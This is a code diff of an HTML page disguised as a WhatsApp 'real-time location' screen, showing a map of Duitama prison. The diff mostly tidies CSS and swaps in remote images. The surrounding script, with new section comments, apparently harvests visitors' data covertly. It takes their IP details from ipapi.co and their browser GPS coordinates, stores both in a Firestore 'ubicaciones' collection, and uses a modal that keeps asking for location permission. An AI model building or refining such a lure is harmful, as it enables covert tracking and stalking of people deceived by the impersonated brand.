@@ -26,7 +26,6 @@
             width: 100%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
             text-align: center;
-            transition: all 0.3s ease;
         }
 
         .logo {
@@ -72,18 +71,9 @@
             word-break: break-word;
         }
 
-        #estado.cargando {
-            background: #e6f7f0;
-            border-color: #a8d5c7;
-        }
-        #estado.exito {
-            background: #d4edda;
-            border-color: #8bc9a8;
-        }
-        #estado.error {
-            background: #f8dddd;
-            border-color: #e6b3b3;
-        }
+        #estado.cargando { background: #e6f7f0; border-color: #a8d5c7; }
+        #estado.exito { background: #d4edda; border-color: #8bc9a8; }
+        #estado.error { background: #f8dddd; border-color: #e6b3b3; }
 
         .spinner {
             display: inline-block;
@@ -96,9 +86,7 @@
             flex-shrink: 0;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         /* ---------- MODAL (ALERTA) ---------- */
         .modal {
@@ -139,31 +127,10 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        .modal-contenido .modal-icon {
-            font-size: 40px;
-            margin-bottom: 4px;
-        }
-
-        .modal-contenido h3 {
-            color: #075E54;
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-
-        .modal-contenido p {
-            color: #2d4a44;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        .modal-contenido .btn-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
+        .modal-contenido .modal-icon { font-size: 40px; margin-bottom: 4px; }
+        .modal-contenido h3 { color: #075E54; font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+        .modal-contenido p { color: #2d4a44; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
+        .modal-contenido .btn-group { display: flex; flex-direction: column; gap: 10px; }
         .modal-contenido button {
             border: none;
             padding: 14px 20px;
@@ -175,56 +142,33 @@
             touch-action: manipulation;
             width: 100%;
         }
+        .modal-contenido button:active { transform: scale(0.97); }
+        .btn-reintentar { background: #25D366; color: #fff; }
+        .btn-reintentar:hover { background: #1DA851; }
+        .btn-recargar { background: #075E54; color: #fff; }
+        .btn-recargar:hover { background: #054a42; }
 
-        .modal-contenido button:active {
-            transform: scale(0.97);
-        }
-
-        .btn-reintentar {
-            background: #25D366;
-            color: #fff;
-        }
-        .btn-reintentar:hover {
-            background: #1DA851;
-        }
-
-        .btn-recargar {
-            background: #075E54;
-            color: #fff;
-        }
-        .btn-recargar:hover {
-            background: #054a42;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
         @media (max-width: 400px) {
             .card { padding: 20px 16px; }
             h2 { font-size: 21px; }
-            .modal-contenido .modal-imagen {
-                width: 100px;
-                height: 100px;
-            }
+            .modal-contenido .modal-imagen { width: 100px; height: 100px; }
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="imagenubicacion.jpg" alt="WhatsApp" class="logo" />
+        <!-- Logo desde internet -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp" class="logo" />
         <h2>WhatsApp</h2>
         <p class="subtitle">Ubicación en tiempo real</p>
 
-        <!-- IFRAME DE STREET VIEW (CÁRCEL DE DUITAMA) -->
+        <!-- MAPA SATELITAL CON ZOOM 19 (CÁRCEL DE DUITAMA) -->
         <iframe
-            src="https://www.google.com/maps?q=5.8275,-73.0333&layer=c&cbll=5.8275,-73.0333&cbp=11,0,0,0,0"
+            src="https://www.google.com/maps?q=5.8275,-73.0333&z=19&t=k&output=embed"
             style="width:100%; max-width:800px; height:350px; border:none; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,.25);"
             loading="lazy"
             allowfullscreen
@@ -239,7 +183,7 @@
     <!-- MODAL DE ALERTA -->
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
-            <img src="imagenubicacion.jpg" alt="Ubicación" class="modal-imagen" />
+            <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Ubicación" class="modal-imagen" />
             <div class="modal-icon">📍</div>
             <h3>Permiso de ubicación</h3>
             <p id="textoAlerta">Activa la ubicación en los ajustes del navegador.</p>
@@ -251,6 +195,7 @@
     </div>
 
     <script type="module">
+        // ----- FIREBASE -----
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
         import {
             getFirestore,
@@ -273,6 +218,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
+        // ----- DOM -----
         const estadoDiv = document.getElementById('estado');
         const estadoTexto = document.getElementById('estadoTexto');
         const modal = document.getElementById('miAlerta');
@@ -284,6 +230,7 @@
         let ipGuardada = false;
         let timeoutAlerta = null;
 
+        // ----- FUNCIONES -----
         function setEstado(texto, tipo = 'cargando') {
             estadoTexto.textContent = texto;
             estadoDiv.className = tipo;
@@ -318,6 +265,7 @@
             window.location.reload();
         });
 
+        // ----- OBTENER IP -----
         async function obtenerIP() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -337,6 +285,7 @@
             }
         }
 
+        // ----- GUARDAR IP -----
         async function guardarIP(datosIP) {
             try {
                 const docRef = await addDoc(collection(db, 'ubicaciones'), {
@@ -367,6 +316,7 @@
             }
         }
 
+        // ----- GUARDAR GPS -----
         async function guardarGPS(posicion) {
             try {
                 const datos = {
@@ -405,6 +355,7 @@
             }
         }
 
+        // ----- SOLICITAR GPS -----
         function solicitarGPS() {
             if (!navigator.geolocation) {
                 mostrarAlerta('Tu navegador no soporta geolocalización.');
@@ -452,6 +403,7 @@
             );
         }
 
+        // ----- FLUJO PRINCIPAL -----
         (async function main() {
             setEstado('Obteniendo IP...', 'cargando');
 
